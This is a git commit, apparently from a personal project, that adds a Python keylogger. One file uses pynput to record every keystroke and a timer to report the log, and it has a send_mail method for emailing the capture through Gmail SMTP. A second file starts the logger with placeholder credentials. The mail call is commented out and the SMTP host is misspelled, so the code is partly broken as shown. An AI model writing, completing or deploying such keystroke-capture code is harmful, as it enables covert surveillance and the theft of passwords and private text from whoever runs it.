a16b6b9742ceb9ffb1ba28fdfa1c70f94b78fbc4
osama asasfah <osamaasf12@gmail.com>
2023-05-10 23:51:20 +0300

    the logger system

---
+++ Keylogger.py
@@ -0,0 +1,46 @@
+import smtplib
+import threading
+import pynput.keyboard
+
+
+class Keylogger:
+    def __init__(self,time_interval,email,password):
+        #
+        self.log = ""
+        self.interval=time_interval
+        self.email=email
+        self.password=password
+        self.start()
+
+    def append_to_log(self,string):
+        self.log=self.log+string
+
+    def process_key_press(self,key):
+
+        try:
+           current_key=str(key.char)
+        except AttributeError:
+            current_key = " "+str(key)+" "
+        self.append_to_log(current_key)
+    def report(self):
+        print(self.log)
+        #self.send_mail(self.email,self.password,self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def send_mail(self,email, password, message):
+        server = smtplib.SMTP("smpt.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
+
+
---
+++ OhLogger.py
@@ -0,0 +1,7 @@
+
+
+import Keylogger
+
+my_logger=Keylogger.Keylogger(5,"your email","yourPass")
+
+
